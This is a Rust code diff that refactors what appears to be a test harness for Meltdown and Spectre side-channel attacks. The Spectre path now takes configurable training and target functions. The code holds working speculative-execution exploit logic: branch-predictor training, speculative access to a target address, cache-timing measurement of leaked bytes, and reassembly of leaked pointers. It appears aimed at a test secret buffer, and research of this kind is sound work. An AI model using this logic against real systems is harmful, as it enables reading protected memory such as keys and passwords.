@@ -31,9 +31,16 @@ pub static MINIDOW_SECRET: &[u8; 128] =
 
 #[cfg(feature = "tester")]
 pub trait Method {
-    const NB_CYCLES_OFFSET: u64;
+    fn nb_cycles_offset(&self) -> u64 {
+        return 0;
+    }
 
-    unsafe fn perform(preload_op: unsafe fn(), target_address: *const u8, dest_array: &mut [u8]);
+    unsafe fn perform(
+        &self,
+        preload_op: unsafe fn(),
+        target_address: *const u8,
+        dest_array: &mut [u8],
+    );
 }
 
 #[cfg(feature = "tester")]
@@ -41,9 +48,12 @@ pub struct Meltdown;
 
 #[cfg(feature = "tester")]
 impl Method for Meltdown {
-    const NB_CYCLES_OFFSET: u64 = 0;
-
-    unsafe fn perform(preload_op: unsafe fn(), target_address: *const u8, dest_array: &mut [u8]) {
+    unsafe fn perform(
+        &self,
+        preload_op: unsafe fn(),
+        target_address: *const u8,
+        dest_array: &mut [u8],
+    ) {
         for i in 0..dest_array.len() {
             let mut histogram = [0usize; 256];
 
@@ -57,7 +67,7 @@ impl Method for Meltdown {
 
                 access_memory(BASE_ADDR, target_address as usize + i);
 
-                let leaked_byte = measure_byte::<Self>().unwrap_or(0);
+                let leaked_byte = measure_byte(self).unwrap_or(0);
                 histogram[leaked_byte as usize] += 1;
             }
 
@@ -77,13 +87,38 @@ impl Method for Meltdown {
 }
 
 #[cfg(feature = "tester")]
-pub struct Spectre;
+pub struct Spectre {
+    pub nb_cycles_offset: u64,
+    training_func: unsafe extern "C" fn(base_addr: usize, off: usize),
+    target_func: unsafe extern "C" fn(base_addr: usize, off: usize),
+}
+
+#[cfg(feature = "tester")]
+impl Spectre {
+    pub fn new(
+        training_func: Option<unsafe extern "C" fn(base_addr: usize, off: usize)>,
+        target_func: Option<unsafe extern "C" fn(base_addr: usize, off: usize)>,
+    ) -> Self {
+        Self {
+            nb_cycles_offset: 25,
+            training_func: training_func.unwrap_or(access_memory_spectre),
+            target_func: target_func.unwrap_or(access_memory_spectre),
+        }
+    }
+}
 
 #[cfg(feature = "tester")]
 impl Method for Spectre {
-    const NB_CYCLES_OFFSET: u64 = 25;
+    fn nb_cycles_offset(&self) -> u64 {
+        self.nb_cycles_offset
+    }
 
-    unsafe fn perform(preload_op: unsafe fn(), target_address: *const u8, dest_array: &mut [u8]) {
+    unsafe fn perform(
+        &self,
+        preload_op: unsafe fn(),
+        target_address: *const u8,
+        dest_array: &mut [u8],
+    ) {
         let target = (Wrapping(target_address as usize)
             - Wrapping(&MINIDOW_SECRET[64] as *const _ as usize))
         .0;
@@ -92,10 +127,10 @@ impl Method for Spectre {
 
         for i in 0..dest_array.len() {
             let mut found = false;
-            for _ in 0..1000 {
+            for _ in 0..1_000 {
                 // training phase
-                for i in 0..10_000 {
-                    access_memory_spectre(base_addr, i % limit);
+                for i in 0..5_000 {
+                    (self.training_func)(base_addr, i % limit);
                 }
 
                 // attack phase
@@ -109,9 +144,9 @@ impl Method for Spectre {
                 preload_op();
                 asm!("mfence", "lfence");
 
-                access_memory_spectre(base_addr, target + i);
+                (self.target_func)(base_addr, target + i);
 
-                let measured_byte = measure_byte::<Self>().unwrap_or(0);
+                let measured_byte = measure_byte(self).unwrap_or(0);
                 if measured_byte != 0 {
                     dest_array[i] = measured_byte;
                     found = true;
@@ -126,9 +161,9 @@ impl Method for Spectre {
 }
 
 #[cfg(feature = "tester")]
-pub fn read_ptr<M: Method>(preload_op: unsafe fn(), target_adress: usize) -> usize {
+pub fn read_ptr<M: Method>(method: &M, preload_op: unsafe fn(), target_adress: usize) -> usize {
     let mut arr = [0; 8];
-    unsafe { M::perform(preload_op, target_adress as *const u8, &mut arr) };
+    unsafe { method.perform(preload_op, target_adress as *const u8, &mut arr) };
     arr.iter()
         .enumerate()
         .fold(0, |acc, (pos, e)| acc | ((*e as usize) << (pos * 8)))
